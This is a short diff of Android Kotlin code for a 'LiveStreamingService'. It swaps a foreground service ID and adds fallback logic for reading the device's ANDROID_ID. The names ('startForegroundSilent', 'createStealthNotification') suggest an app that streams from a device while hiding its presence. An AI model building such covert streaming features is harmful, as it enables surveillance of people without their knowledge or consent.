@@ -46,14 +46,18 @@ class LiveStreamingService : Service() {
 
     private fun startForegroundSilent() {
         val notification = StealthNotificationHelper.createStealthNotification(this)
-        startForeground(StealthNotificationHelper.CAMERA_SERVICE_ID + 10, notification)
+        startForeground(StealthNotificationHelper.LIVE_STREAMING_SERVICE_ID, notification)
     }
 
     private fun getDeviceIdentifier(): String {
-        return android.provider.Settings.Secure.getString(
-            contentResolver,
-            android.provider.Settings.Secure.ANDROID_ID
-        ) ?: "unknown"
+        return try {
+            android.provider.Settings.Secure.getString(
+                contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
+        } catch (e: Exception) {
+            AndroidConfig.deviceId.ifEmpty { "unknown" }
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
